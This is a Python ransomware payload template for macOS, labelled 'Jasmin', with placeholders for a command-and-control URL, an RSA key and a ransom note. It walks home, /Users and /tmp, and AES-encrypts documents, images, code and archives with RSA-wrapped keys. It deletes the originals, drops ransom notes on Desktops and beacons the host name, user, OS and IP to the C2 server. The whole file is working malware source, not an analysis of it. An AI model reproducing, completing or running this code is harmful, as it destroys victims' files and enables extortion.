#!/usr/bin/env python3
# Jasmin macOS Payload — Auto-generated
import os,sys,subprocess,struct,hashlib,socket,platform,datetime,json
try:import urllib.request,urllib.parse
except:pass

C2='{{C2_URL}}'
SECRET='{{HANDSHAKE}}'
RSA_PUB=b"""{{RSA_PUBLIC_KEY}}"""

USE_LIB=False
try:
    for cmd in [[sys.executable,'-m','ensurepip','--default-pip']]:
        try:subprocess.run(cmd,capture_output=True,timeout=30)
        except:pass
    for cmd in [
        [sys.executable,'-m','pip','install','-q','--user','cryptography'],
        [sys.executable,'-m','pip','install','-q','cryptography'],
        ['pip3','install','-q','--user','cryptography'],
    ]:
        try:
            r=subprocess.run(cmd,capture_output=True,timeout=120)
            if r.returncode==0:break
        except:continue
    from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
    from cryptography.hazmat.primitives.asymmetric import padding as ap
    from cryptography.hazmat.primitives import hashes,serialization
    from cryptography.hazmat.backends import default_backend
    USE_LIB=True
except:
    USE_LIB=False

def _has_openssl():
    try:return subprocess.run(['openssl','version'],capture_output=True).returncode==0
    except:return False
HAS_OPENSSL=_has_openssl()
if not USE_LIB and not HAS_OPENSSL:
    print('[!] 无cryptography库且无openssl命令');sys.exit(1)

import tempfile as _tf
EXTS={'.pptx','.docx','.xlsx','.txt','.pdf','.csv','.jpg','.jpeg','.png','.zip','.rar','.7z','.mp3','.mp4','.sql','.bak','.html','.php','.py','.java','.json','.xml','.yaml','.md','.conf'}
SKIP_DIRS=frozenset(['/System','/Library','/usr','/bin','/sbin','/private/var/db','/dev','/Volumes'])
NOTE_NAME='READ_ME_解密教程.txt'

def skip(p):
    fp=os.path.abspath(p)
    n=os.path.basename(fp)
    if fp.endswith('.jasmin') or n.startswith('READ_ME_'):return True
    for d in SKIP_DIRS:
        if fp.startswith(d+'/'):return True
    if '/.ssh/' in fp:return True
    _,e=os.path.splitext(fp)
    return e.lower() not in EXTS

def pad16(d):
    n=16-(len(d)%16);return d+bytes([n]*n)

def _enc_lib(path,pub):
    k,iv=os.urandom(32),os.urandom(16)
    c=Cipher(algorithms.AES(k),modes.CBC(iv),default_backend()).encryptor()
    p=open(path,'rb').read()
    if not p:return False
    h=hashlib.sha256(p).digest()
    ct=c.update(pad16(p))+c.finalize()
    ek=pub.encrypt(k+iv,ap.OAEP(mgf=ap.MGF1(hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
    with open(path+'.jasmin','wb') as f:
        f.write(h);f.write(ct);f.write(ek);f.write(struct.pack('<I',len(ek)))
    os.remove(path);return True

def _enc_openssl(path,pub_pem_path):
    p=open(path,'rb').read()
    if not p:return False
    h=hashlib.sha256(p).digest()
    k,iv=os.urandom(32),os.urandom(16)
    td=_tf.mkdtemp()
    try:
        pf=os.path.join(td,'p');kf=os.path.join(td,'k');cf=os.path.join(td,'c');ef=os.path.join(td,'e')
        open(pf,'wb').write(pad16(p));open(kf,'wb').write(k)
        r=subprocess.run(['openssl','enc','-aes-256-cbc','-nosalt','-in',pf,'-out',cf,'-K',k.hex(),'-iv',iv.hex()],capture_output=True)
        if r.returncode!=0:return False
        ct=open(cf,'rb').read()
        open(kf,'wb').write(k+iv)
        r=subprocess.run(['openssl','pkeyutl','-encrypt','-pubin','-inkey',pub_pem_path,'-in',kf,'-out',ef,'-pkeyopt','rsa_padding_mode:oaep','-pkeyopt','rsa_oaep_md:sha256','-pkeyopt','rsa_mgf1_md:sha256'],capture_output=True)
        if r.returncode!=0:return False
        ek=open(ef,'rb').read()
        with open(path+'.jasmin','wb') as f:
            f.write(h);f.write(ct);f.write(ek);f.write(struct.pack('<I',len(ek)))
        os.remove(path);return True
    finally:
        import shutil;shutil.rmtree(td,True)

def encrypt(path,pub_obj,pub_pem_path):
    if skip(path):return False
    try:
        if USE_LIB:return _enc_lib(path,pub_obj)
        else:return _enc_openssl(path,pub_pem_path)
    except:return False

RANSOM_TXT="""
{{RANSOM_NOTE}}
"""

def get_sid():
    try:return hex(os.getuid())+'-'+socket.gethostname()
    except:return 'unknown'

def drop_notes(dirs,sid):
    txt=RANSOM_TXT.replace('{sid}',sid)
    for d in dirs:
        if not os.path.isdir(d):continue
        try:open(os.path.join(d,NOTE_NAME),'w').write(txt)
        except:pass
        for desk in ['Desktop','桌面']:
            dp=os.path.join(d,desk)
            if os.path.isdir(dp):
                try:open(os.path.join(dp,NOTE_NAME),'w').write(txt)
                except:pass

def beacon(sid):
    try:
        d={'handshake':SECRET,'machine_name':socket.gethostname(),'computer_user':os.getenv('USER','?'),
           'os':f'{platform.system()} {platform.release()}','date':datetime.datetime.now().strftime('%d/%m/%Y, %A'),
           'time':datetime.datetime.now().strftime('%H:%M:%S'),'ip':'0.0.0.0','location':'?',
           'systemid':sid,'password':'RSA_PROTECTED'}
        try:d['ip']=urllib.request.urlopen('https://api.ipify.org',timeout=5).read().decode()
        except:pass
        req=urllib.request.Request(C2,data=urllib.parse.urlencode(d).encode(),method='POST')
        urllib.request.urlopen(req,timeout=10)
    except:pass

def main():
    pub_obj=None;pub_pem_path=None
    if USE_LIB:
        pub_obj=serialization.load_pem_public_key(RSA_PUB,default_backend())
    else:
        td=_tf.mkdtemp();pub_pem_path=os.path.join(td,'pub.pem')
        open(pub_pem_path,'wb').write(RSA_PUB)
    sid=get_sid();beacon(sid);n=0
    roots=[os.path.expanduser('~'),'/Users','/tmp']
    for r in roots:
        if not os.path.isdir(r):continue
        for dp,_,fs in os.walk(r):
            for f in fs:
                if encrypt(os.path.join(dp,f),pub_obj,pub_pem_path):n+=1
    drop_notes(roots,sid)

if __name__=='__main__':main()
